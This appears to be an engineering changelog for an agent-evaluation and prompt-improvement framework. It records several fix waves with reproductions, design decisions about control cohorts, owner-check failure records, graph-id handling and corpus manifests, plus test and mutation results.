`ProseControlCohortGenerator` builds the real null: N placebo bullets in the
same section at the same insertion point, **matched to the treatment's token
count**, drawn from a task-neutral vocabulary, seeded from `cohort_seed` and
the candidate's SHA-256 so the threshold can be re-derived. A member is the
candidate with the bullet's *text* substituted, so the only variable between
the arms is the words.

Three alternatives argued and rejected: another graph's lesson (it *was*
reasoned about, so it is not what "changes that were not reasoned about"
score); the word-shuffle (it preserves every content word, and ADR 0157 showed
the active ingredient is a literal token — that is the leak shape, not a
control); deleting the bullet (the incumbent, zero variance, p95 collapses onto
it and "beats the cohort" degenerates into "beats the incumbent").
`ProseCohortLeakError` refuses any placebo sharing a content word with the
treatment — the mutation the brief named kills 13 tests.

**Stated rather than discovered**: the placebo controls for a bullet's
presence, shape, position and length, **not for the plausibility of its
content**. A plausible-but-wrong null needs a model, and `gates/base.py`
requires every gate to be deterministic — so that stronger control is forbidden
by the gate contract, not merely unbuilt.

**D3 (0157's defect 5) — a spent call nobody counted.** `--proposer llm`
against a `.md` spends one call, the reply fails `ast.parse`, the rule-based
fallback has no constant to edit, and the rejection vanished with the rationale
it lived in. Not in the summary, not in the ledger (a cycle that proposes
nothing writes none), not in `cycles.jsonl`. `ProposerSpend` counts **attempts**
— incremented before the provider returns, because a request that errors after
it left has still been spent — and the note is appended to the line
`cmd_cycle` journals, so it reaches `cycles.jsonl` with `aef/cli/` untouched.

**Both verdicts, offline.** `tests/harness/test_prose_gate_path.py` runs the
real six-gate pipeline on a prompt-file repo with cassettes:

```
G3 pass  candidate mean 1 beats the control cohort's p95 of 0.5
         → escalate — every gate passed, but Tier-1 auto-merge is not enabled
```

and, on a fixture identical except that the **placebos** also produce the
verdict line:

```
G3 fail  candidate does not beat the p95 of the random control cohort — this is
         the null hypothesis, not an improvement
         → reject
```

The second is the one that matters: a test demanding acceptance can be met by
weakening G3, and this one can only be met by G3 still binding. **No threshold,
no accept/reject rule, no `PolicyEngine`, and no existing test changed** — the
one existing test that a refactor would have broken was kept green by keeping
the materialisation loop in one place instead, which is what it exists to
enforce.

**Mutations: 11 perturbed, 11 killed**, each restored from a shasum-verified
byte backup with the final hash asserted equal to the pre-edit hash.

**Green bar.** `pytest -q` **2236 passed, 5 skipped**; collected **2205 → 2241
(+36, none removed)**. `mypy aef examples` clean, 133 files. `ruff check .`
clean. `ruff format --check aef tests examples` clean, 259 files.

**No rubric score moves.** What would earn a dimension-2 point is an accept
verdict on a prompt candidate scored **live**, against S2's noise floor (0.7639
± 0.1666) — M5's and M6's evidence, not this worker's. The fixtures here are
plumbing proofs and their own docstring says so.

## Fix wave H1 — the bytes, the marker, and the nightly green tick (ADR 0172)

Five findings of the second seam hunt, all in `aef adopt` and the workflow it
renders. Four reproduced by RUNNING a command before anything was changed; the
fifth is a property of a string in YAML for a scheduler this branch cannot run,
and is labelled that way rather than dressed up as a measurement.

**R1 — ADR 0153's whole argument held for LF only.** That ADR's justification
for appending inside markers is one sentence: *every pre-existing byte survives
verbatim*. `Path.read_text()` translates `\r\n` to `\n`; `apply_block` was
byte-exact on the TRANSLATED text; `Path.write_text()` wrote it back with
`os.linesep`. On a CRLF `AGENTS.md`:

```
$ aef adopt --dir r1
appended aef block to .../r1/AGENTS.md (your bytes outside it are unchanged)
$ git -C r1 diff --stat -- AGENTS.md
 1 file changed, 41 insertions(+), 5 deletions(-)
-# House rules^M
-Our agents read this file.^M          # every original line, as a deletion
```

Five deletions and a report saying nothing outside the block moved. The mirror
is on Windows, where `write_text` would make every file this scaffold *writes*
CRLF while its own tests compare against LF. Fixed by reading and writing
bytes, rendering only the ADDED bytes in the file's dominant line ending, and
pasting the outside slices back verbatim — so a **mixed** file keeps every line
exactly as its author left it. The claim is now executable:
`_verify_preserved(prefix, suffix, result)` runs before every write and the
write is refused if it fails. After: `36 insertions(+)`, zero deletions,
original bytes at offset 0.

**R2 — a balanced marker pair in the adopter's own prose made adopt delete the
text between it.** `apply_block` took the first `<!-- aef:begin -->` and the
next `<!-- aef:end -->` anywhere in the file. This kit teaches those exact
strings in four generated documents, so an adopter quoting them is the ordinary
case. A `CLAUDE.md` quoting both with two house rules between them:

```
$ grep -c "RULE 7" r2/CLAUDE.md     # before: 1
$ aef adopt --dir r2
appended aef block to .../r2/CLAUDE.md (your bytes outside it are unchanged)
$ grep -c "RULE 7" r2/CLAUDE.md     # after: 0
```

ADR 0153's three refusals cover the *unbalanced* shapes. The balanced pair
adopt did not author was the missing fourth, and the only destructive one. The
begin marker now carries a signature — `<!-- aef:begin sha256=1a2b3c4d5e6f7081 -->`,
16 hex over the block body — and **only a signed pair is adopt's**; every other
`aef:begin`/`aef:end` is inert prose. A pre-signature block is upgraded ONCE
with a printed checklist notice, recognised only when its first body line is
one adopt itself emits: treating it as prose would leave the stale block and
append a second, and two contradicting copies of the contract in the file the
repo's agents read is the worse failure.

**R3 — the rendered nightly workflow read every exception as a healthy
rejection.** `aef migrate` writes the placeholder `agents/migrated/graph.py`
whenever it finds no wrappable call site — every prompt-file repo, which is
every repo in the survey — and its `build_graph()` raises. The workflow's
`AEF_MODULE` defaulted to it, so the module the job names exists and cannot
build:

```
$ aef loop cycle ... --module agents.migrated.graph ...
error: aef migrate found no wrappable call site in this repo.
EXIT=1
```

1 is `EXIT_REJECTED`; the step fails only on `status >= 2`. Green job, nothing
proposed, and nothing in `cycles.jsonl` for ADR 0165's staleness warning to
count. **ADR 0153's "the job fails visibly" was false**, and both errata are
appended there. Fixed twice over: the workflow names the first migrated
prompt-agent module (derived from migrate's own discovery and sanitiser, never
the placeholder), and a guard step before the cycle imports the module, calls
`build_graph()`, and fails the job with the actual exception in
`$GITHUB_STEP_SUMMARY` — not migrate's call-site sentence, which explains why
the placeholder exists and not why tonight failed. The guard was extracted from
the rendered YAML and EXECUTED in three states: missing module (exit 1),
placeholder named by name (exit 1), real graph after `aef migrate` (exit 0).
The exit-code test reads `aef/harness/loop.py`'s constants at test time, so it
is sharp whether or not G1a's distinct `EXIT_ERROR` has landed.

**R4 — adopt counted prompt agents flat while migrate recurses.** ADR 0152
measured `rglob` against the Claude Code CLI. `detect_prompt_surface` globbed
one level. One nested persona:

```
detected framework: prompt_files (7 agents, 5 skills)     # and in the checklist,
                                                          # and in the appended block
$ aef migrate --dir r4 && ls r4/agents/migrated/ | wc -l   # 8 graphs + placeholder
```

Adopt imports `discover_prompt_agents`/`discover_skills` from migrate now, with
its own-output exclusion applied on top. One discovery, one number.

**S1 (reasoned, NOT executed) — the nightly cycle's state was frozen after run
1.** `actions/cache` skips its post-job save on an exact key hit, and
`key: loop-state-${{ github.repository }}` contains nothing that varies. Both
rendered workflows now use a run-scoped key with a prefix `restore-keys`.

Also: `render_aef_yaml` finally mentions `shadow.containment` — the mode
defaults to `auto`, and `auto` *refuses* rather than downgrading, which is a
default an adopter should not have to meet as an error message.

**Reported, NOT fixed** (neither file is this worker's):

1. `discover_skills` counts the `SKILL.md` that `aef adopt` itself writes — 5
   from adopt against 6 from migrate on the same tree. `aef/cli/migrate.py`;
   the exclusion adopt applies should be mirrored there.
2. This repo's own `.github/workflows/loop-monitor.yml` **and**
   `loop-gate.yml` carry the same constant `loop-state-${{ github.repository }}`
   cache key S1 fixes in the rendered ones. G1a owns those files.

**Mutations:** 11 planted, 11 caught, every restore sha256-verified and every
patch asserting its anchor first. M10 (the cycle summary loses its exit-code
meanings) **survived the first pass**, because the test asserted every arm
except exit 0 — the arm the nightly job is actually green on. The test now
parses all four arms out of the rendered shell `case` and requires each to be
non-empty and correct.

**Green bar:** 2291 passed / 5 skipped (2269 → 2296 collected, +27),
`mypy aef examples` clean over 132 files, `ruff check .` clean,
`ruff format --check aef tests examples` clean. Zero live model calls.

## M4b — a failed check is what the run did (ADR 0174)

The wire M4 and S1 hit from opposite sides on the same night, and which ADR
0157's "Undone" says nobody owned. Model: `claude-opus-5[1m]`. **3 live calls**
(budget 8). **No rubric dimension moves.**

### Both reproductions, RUN, before anything changed

M4's, on a copy of the marlin clone, offline (a stub provider replaying the
answers M4's live bootstrap recorded — byte-identical replies, zero quota):

```
recorded 2 scenario(s) in the train split
  passed  accela-preconditions
  passed  accela-missing-credentials
0 of 2 recorded run(s) failed. A corpus where everything passes cannot
demonstrate an improvement …

accela-preconditions       -> success | no failure signals: 0 error(s) recorded, 0 tool call(s), none failed
accela-missing-credentials -> success | no failure signals: 0 error(s) recorded, 0 tool call(s), none failed
```

— while the scorer, from the same cassette, says
`0.0000 accela-missing-credentials / check failed: working_memory.prompt_agent
contains 'VERDICT:'` — and the cycle says
`no admissible failure memory: no candidate this cycle`.

S1's, the six summary validation scenarios through the real
`retrieve → draft → reflect → consolidate` graph with one durable store:

```
memory: 6 success record(s), 0 failure record(s)   (six unique signatures)
CONSOLIDATED: 0 knowledge entr(ies)
```

**and two of those six FAIL an owner check** (`sum-14` wants `swimming` and got
`Swimming`; `sum-16` wants `landslip` and got `Landslip`). One cause:
`make_reflect_node` writes `kind="failure"` only from `state.errors` /
`state.tool_results`, and a check is the task metric the harness evaluates
afterwards (ADR 0113).

### The producer

`aef/harness/check_memory.py`. When a run raised nothing and an owner check
failed, it runs the **real** `Critic`/`Judge` over that state with the check
failures as evidence and writes one `kind="failure"` record in
`make_reflect_node`'s own content shape.

**Design (a) — a LOCAL derived state — and (b) rejected by measurement.**
Injecting the failures into the run's real `state.errors` instead:

```
  as run:    task_completion=0.7500  checks=3/4
  injected:  task_completion=0.0000  checks=3/4
  classify().passed  as run=True  injected=False
```

`score_scenario` stops counting the check fraction the moment errors exist, so
the score falls to zero *because* the checks failed — a metric that changes
when you measure it — and `classify` reports a wrong answer as a crash.

**The signature drops the expected value** (`check:<path>:<op>`), and that is
load-bearing twice. Recurrence, measured:

| corpus | shipped (`path:op`) | value-keyed |
|---|---|---|
| summary validation split (S1's) | **1 entry** | **0** |
| marlin pilot (M4's) | **1 entry** | 1 |

and leakage: the signature is a prompt surface (`render_retrieved_context`'s
`[label]`, the proposer's `<!-- aef sig=… -->`).

**Teaching to the test.** The rendering never reads `check.value`:

```
check failed: working_memory.prompt_agent does not contain a required substring
the owner declared; observed 406 words, 2836 chars: '**No. The Accela connector…'
```

where ADR 0157's bullet said ``contains 'VERDICT:'``. Uniform across all six
ops — a `max_words` failure gives the observed word count and never the cap.
**What it still leaks, named rather than claimed away:** the state path, the
operator (for an `equals` check on a binary field that leaks the answer
completely), the observed value, and the pass/fail counts. The defensible claim
is only that a lesson can no longer be satisfied by pasting a string out of it.

### The falsification, stated first, did not fire

`BootstrapInput`'s own docstring already distinguishes `expected` — *"a
judgement about what the run turned out to do"*, refused by name — from
`checks` — *"a specification of the task written before the run"*. The check is
the owner's and predates the run; the observed value is the run's. ADR 0145's
"a graph with no reflect node leaves an empty sink" is narrowed **in writing,
with a test**; ADR 0060 is untouched, and with no checks declared bootstrap
still authors nothing at all.

One call site (`bootstrap`); two refusals with reasons already in the code —
`score`/`run_scenario` by its own invariant that a gate run must not mutate the
evidence a later proposal is built from, and `run --record-runs`/`harvest`
because a production run carries no owner check and `RecordedRun` has no field
for one.

### End to end

```
0 of 2 recorded run(s) raised, and 1 FAILED AN OWNER CHECK …
  1 of them is/are a check-derived FAILURE record …
CONSOLIDATED 1 entr(ies)
  failure:check:working_memory.prompt_agent:contains | runs=2
    ['accela-missing-credentials', 'accela-pinellas']

  proposed cycle-20260905T032809-prompt … (proposer=rule_based_prompt)
  G0 pass · G1 pass · G4 pass · G5 pass (drift 0.007/0.500) · G2 fail (TrustBoundaryError)
```

G2's failure there is ADR 0157's defect 1 — **fixed on `main` by M4c (ADR
0170) mid-increment**. Re-run on the merged code, the gates build a prose
control cohort and execute **21 scenarios** (`1 candidate + 1 incumbent + 5
random control(s)`), and G2 rejects for a different reason: `3
previously-passing scenario(s) no longer pass`. Confirmed at zero live cost —
incumbent `3 cassette hit(s), 0 miss(es)` mean 0.3333, candidate `0 hits, 3
misses` mean 0.0000. That is precisely the artifact UPGRADE_LOOP's own rule
names ("never let a cassette miss score a changed prompt as 0 and call that a
rejection"); the correct invocation is `--cassette-miss live`, 21 live
executions, beyond the 5 calls left in budget — so **no live gate verdict is
claimed**. `grep -c VERDICT memory.jsonl → 0`.

**Live, 3 calls**: preflight (`is_error False`, `input_tokens 2`,
`claude-opus-5[1m]`) plus two bootstrap recordings against
`model_provider.impl: claude_code` — two real objectives, two runs failing one
check, one entry, the same candidate, the same gate verdicts. **Nothing
synthesised**, which retires ADR 0157's `make_evidence.py`.

**S1's side**: the same six scenarios now give 2 failure records under one
signature → 1 entry → the lesson appears in the next run's draft prompt, where
every bullet previously read *"no failure signals"*.

**Re-run on S3b's corpus** (ADR 0171, merged from `main` mid-increment): 17
summary validation scenarios, **four content negatives**, and before the
producer `17 success record(s), 0 failure record(s)` — seventeen unique
signatures, `CONSOLIDATED: 0 knowledge entr(ies)`. With it: 4 failure records
under one signature `failure:check:working_memory.summary:max_words`, **1 entry
across 4 distinct runs**. Two unflattering observations recorded with it: on
this corpus the cap is *in the objective* ("summarise … in at most 28 words"),
so redacting `max_words`' value buys nothing here even though the record's own
text is clean; and the lesson is **retrieved and does not reach the model** —
chunk 14 of 24, score 0.125, while `render_retrieved_context(max_items=5)`
shows five `no failure signals` successes.

**`aef loop bootstrap` now counts a wrong answer as a failure.** S3b
reproduced the old line — eight inputs, three content negatives, `0 of 8
recorded run(s) failed. A corpus where everything passes cannot demonstrate an
improvement`. One count now, same definition the producer uses, split into its
halves: `2 of 3 recorded run(s) FAILED: 1 raised or ended with a failed plan, 1
failed an owner check`, with per-scenario `FAILED` / `WRONG` / `passed`.

### Mutations, green bar, and what is not claimed

6 mutations, 6 kills, every restore sha256-verified against a pre-edit hash
(never `git checkout --`). The headline one: drop the producer from
`bootstrap`, re-run the whole pilot → `no admissible failure memory: no
candidate this cycle`.

`pytest -q`: **2482 passed, 6 skipped**; collected 2438 → **2488 (+50, none
removed)** after two `origin/main` merges (2262 → 2305 on the pre-merge base).
`mypy aef examples` clean (134 files), `ruff check .` clean, `ruff format
--check` clean (270 files). S1's golden is green.

**No rubric change.** No task score was measured; the artifact is a capability
that was absent and is now present. S1's four arms are runnable as a real
comparison for the first time, and what they need is a corpus whose failures
recur — **S3b is building it tonight**. Re-running (a)/(b)/(c)/(d) against that
corpus is the measurement that could move dimension 2, not this increment.

**Defects found outside this worker's files.** `knowledge_boost = 0.0` hides
the only lesson there is, and now has a counter-example: over S3b's split the
single check-derived entry ranks **14 of 24** at the default and **3 of 24** at
0.5, so it survives `render_retrieved_context`'s top-5 only when boosted — ADR
0110 swept 0/0.5/1/3 and found no change, on a corpus that could not produce
seventeen near-identical successes crowding one lesson. Also: `aef loop cycle` silently drops
all evidence without `--graph-id` (`2 record(s) dropped as another graph's
scenario`) though the graph id is in the corpus it already loaded; ADR 0157's
G2/G3 defects reproduce unchanged; `loop score` wants `module:factory` where
`loop bootstrap` wants `module`; and a copied corpus's stale `manifest.json`
makes the next cycle refuse with `corpus shrank`, with no command to reconcile
it.

## Fix wave I1 — two spellings of "which graph", and no way back (ADR 0176)

Four findings, none of them this worker's own discovery: three from ADR 0174's
"Defects found outside this worker's files" (M4b) and one from ADR 0172's
"Reported for migrate's owner, not fixed here" (H1). Every one was reproduced
by RUNNING a command before anything changed. **Zero live model calls** — the
graphs here never reach their model path.

**F2 — `aef loop cycle` dropped all its evidence without `--graph-id`.**
Bootstrap two inputs whose owner checks the graph fails, so ADR 0174's producer
writes two `failure` records, then cycle with the prompt proposer:

```
$ aef loop cycle --repo repo --state state --workdir work --corpus corpus \
    --memory memory.jsonl --proposer rule_based_prompt \
    --agent-path agents/demo/persona.md
  the proposer produced nothing from the available evidence: 2 record(s)
  dropped as another graph's scenario; no admissible failure record for this graph
exit=0

$ aef loop cycle … --graph-id demo_agent
  proposed cycle-20260905T040818-prompt on local branch loop/cycle-…-prompt
  gated: reject — G1 rejected it: build command failed (exit -1): python -m pytest -q
exit=1
```

Same evidence, one flag, and the flag's value was in the corpus the command had
already loaded.

**The complication, and it is why the fix has a branch nobody would guess at.**
`--graph-id` is TWO things: the archive key G5 reads a blessed baseline under,
and — only for `RuleBasedPromptProposer` — a `Graph.id` scenarios are matched
against. ADR 0125 separated those namespaces deliberately, and
`_scenarios_for_graph` still gates every scenario when the corpus records one
graph for exactly that reason. So the first version of this fix, which derived
unconditionally, moved the archive key out from under an already-blessed
baseline:

```
$ pytest tests/cli/test_adoption_sequence.py
E   AssertionError: not built: G5 rejected the candidate first, so its code
E   was never executed
```

`aef loop bless` takes no `--corpus` at all, so the documented adoption sequence
blesses under `"default"` and would then cycle under `demo_agent`. That is a
worse defect than the one being fixed, and the suite found it, not a reading of
the code.

Shipped: the parser default becomes `None`, so **omitting the flag is
distinguishable from typing it** — everything rests on that — and
`resolve_graph_id_from_corpus` settles the value before `_config` freezes it
into `LoopConfig`. Derive from a single-graph corpus when there is no baseline
to orphan, and say so **in the verdict line** (the line a workflow tees into its
step summary); keep the key and warn with the exact `bless` command when there
is; refuse with the list when the corpus records several; refuse an explicit id
the corpus has never heard of unless a baseline sits under it, in which case it
is ADR 0125's archive-key namespace and gets a warning rather than a refusal.
The refusals are `GraphIdError`, exit 1 and journalled, never a halt.

**F3 — `loop score` took `module:factory`, `loop bootstrap` took `module`.**

```
$ aef loop score agents.demo.graph --corpus corpus
error: entrypoint must be 'module:factory', got 'agents.demo.graph'
$ aef loop bootstrap agents.demo.graph:build_graph --corpus corpus2 --inputs …
error: No module named 'agents.demo.graph:build_graph'
$ aef loop score /…/agents/demo/graph.py --corpus corpus
error: entrypoint must be 'module:factory', got '/…/agents/demo/graph.py'
```

Two loaders, neither wrong alone: `cli.run.load_graph_module` has ADR 0168's
file path and no `BaseException` guard; `scenario_runner.load_graph` has ADR
0085's guard and no file path. One `GRAPH_REFERENCE_HELP` shared **by
reference** by five arguments — five copies of a help string is how `score` came
to describe the same argument a sixth way — and one `load_graph_reference` that
keeps BOTH controls and adds the `isinstance(graph, Graph)` check to all five.
The split is on the last colon and only when the tail is an identifier, so
`a/b/graph.py`, `a/b/graph.py:make` and `C:\a\graph.py` all read the way they
look. The enumerating test derives the covered set from the REAL parser (the
G1a pattern) and runs all fifteen combinations producer→parser→loader.
`run --module` and `--entrypoint` are other workers' files and are pinned as
known gaps rather than half-converted.

**F4 — a copied corpus's stale manifest, and no way back.**

```
$ aef loop cycle … --corpus copied --no-memory
error (CorpusShrankError): corpus shrank: 1 previously-admitted scenario(s) are
gone: ['s-2']. A suite that can be made to pass by deleting the failing case is
not a suite.
exit=3

$ aef loop --help
  {gate,monitor,digest,status,record,bootstrap,score,skills,harvest,cycle,run,bless,doctor}
```

No `corpus` subcommand at all. The refusal is RIGHT — ADR 0141 built it because
deleting the two scenarios the agent failed raised `aef loop score` from 0.6667
to 1.0000 with nothing complaining — and it is **not weakened**: it fires on
exactly the same condition, and mutation M11 re-verifies that it still fires
after being given a remedy. What was missing was the remedy. Without one the
thing people actually do is delete `manifest.json`, which loses every id it was
keeping.

```
$ aef loop corpus reconcile --corpus copied
  DROPPED  s-2 (was train) — no file on disk
manifest rewritten from disk: 1 dropped, 0 moved, 0 added, 2 scenario(s) now recorded
  Those ids are no longer admitted evidence. Commit this manifest in its own
  reviewable change — retiring a scenario is an owner's decision and the diff is
  the record of it (ADR 0141).
```

**The loop provably cannot run it** (ADR 0060's shape): an AST scan over `aef/`
pinning the single caller, a ban on the word `reconcile` inside `cmd_cycle` and
`cmd_run` so an indirect helper cannot slip past a one-hop scan, and a
`save_manifest` caller pin. Verified against the planted fault — putting
`reconcile_manifest(...)` inside `cmd_cycle` fails the test, naming that call
site. A malformed scenario is NOT reconciled away, because a corrupt write must
not be able to retire evidence.

**F1 (H1's finding 1) — `discover_skills` counted adopt's own skill.** On the
pilot clone, adopt said 5 and migrate said 6 about the same tree, the sixth
being the `new-model-check/SKILL.md` adopt had just written. Migrate importing
adopt is a hard cycle, and it was reproduced rather than assumed — the import
patched into the real file, run both directions, restore SHA-256 verified:

```
ImportError: cannot import name '_ADOPT_SKILL_PATH' from partially initialized
module 'aef.cli.adopt' (most likely due to a circular import)
```

So the string moved to `aef/harness/zones.py`, which both CLI modules already
import and which imports neither — the same home and the same argument
`DEFAULT_AGENT_PATH` already has. Only the COUNT excludes it; the listing still
NAMES it, marked `(aef's own — not yours)`, because a migrate that goes silent
about a file it declined to migrate is the one thing that block exists not to
be. H1 wrote its pinned test to hold both numbers so that *"the day migrate
mirrors it, that test says so"*. It said so, and it now asserts the two AGREE,
with the history in its docstring.

**Green bar:** `pytest -q` 2570 passed / 6 skipped, `mypy aef examples` clean,
`ruff check` clean, `ruff format --check` clean. **+60 tests, 2510 → 2570.**
**14 mutations planted, 14 killed**, every restore byte-identical by SHA-256.

**Reported, not fixed** (in ADR 0176's own defects section): `--entrypoint` is
a fourth spelling of "which graph" and `run --module` a fifth, both in other
workers' files; `LoopConfig.graph_id` is one field serving two namespaces, which
is the root of F2 and the reason its fix needs a warning branch at all;
`aef/cli/adopt.py` still spells the skill path itself, pinned by a test until
its owner makes it an alias; one flaky container-sandbox test; and the fact that
the suite fails 28 tests with `[Errno 2] No such file or directory: 'python'`
when the venv is not on `PATH`, which looks exactly like a regression and is not.
